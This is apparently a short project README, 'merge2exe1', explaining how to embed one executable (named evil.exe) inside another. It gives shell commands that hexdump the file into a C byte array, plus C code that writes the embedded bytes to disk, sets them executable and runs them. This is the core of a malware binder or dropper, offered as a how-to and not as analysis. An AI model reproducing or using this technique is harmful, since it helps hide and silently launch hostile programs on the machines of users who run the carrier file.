# merge2exe1
Merge to binary executable files into one executable

The idea. 
You have two executable files and you want merge them into one binary.


Plan.
1. Dump exe files into hex, for ex. evil.exe
 
echo "const unsigned char evil[] = {" > evil.h
cat evil.exe | hexdump -v -e '"0x" 1/1 "%02X" ","' | sed s/,$// >> evil.h
echo "};" >> evil.h

2. Include evil.h into main.c , after execution dump to disc, execute.

#include "evil.h"

// save to disk
file = fopen(bin_name_evil, "w");
fwrite(evil, 1, sizeof(evil), file);
fclose(file);
chmod(bin_name_evil,0755);	  

// execute
execl(bin_name_evil, bin_name_evil, (char *) 0);
